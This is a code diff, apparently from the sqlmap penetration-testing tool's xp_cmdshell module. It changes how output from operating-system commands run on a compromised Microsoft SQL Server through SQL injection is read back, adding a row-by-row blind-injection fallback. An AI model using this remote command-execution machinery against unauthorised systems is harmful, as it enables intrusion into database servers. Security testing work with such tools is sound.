@@ -7,10 +7,13 @@ See the file 'doc/COPYING' for copying permission
 
 from lib.core.agent import agent
 from lib.core.common import Backend
+from lib.core.common import getLimitRange
 from lib.core.common import getSPQLSnippet
 from lib.core.common import hashDBWrite
 from lib.core.common import isListLike
 from lib.core.common import isNoneValue
+from lib.core.common import isNumPosStrValue
+from lib.core.common import isTechniqueAvailable
 from lib.core.common import pushValue
 from lib.core.common import popValue
 from lib.core.common import randomStr
@@ -20,8 +23,11 @@ from lib.core.convert import hexencode
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
+from lib.core.enums import CHARSET_TYPE
 from lib.core.enums import DBMS
+from lib.core.enums import EXPECTED
 from lib.core.enums import HASHDB_KEYS
+from lib.core.enums import PAYLOAD
 from lib.core.exception import sqlmapUnsupportedFeatureException
 from lib.core.threads import getCurrentThreadData
 from lib.core.unescaper import unescaper
@@ -172,7 +178,16 @@ class xp_cmdshell:
                 output = new_output
         else:
             inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))
-            output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False)
+            query = "SELECT %s FROM %s" % (self.tblField, self.cmdTblName)
+            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
+                output = inject.getValue(query, resumeValue=False, blind=False)
+            else:
+                output = []
+                count = inject.getValue("SELECT COUNT(*) FROM %s" % self.cmdTblName, resumeValue=False, inband=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+                if isNumPosStrValue(count):
+                    for index in getLimitRange(count):
+                        query = agent.limitQuery(index, query, self.tblField)
+                        output.append(inject.getValue(query, inband=False, error=False, resumeValue=False))
             inject.goStacked("DELETE FROM %s" % self.cmdTblName)
 
             if output and isListLike(output) and len(output) > 1:
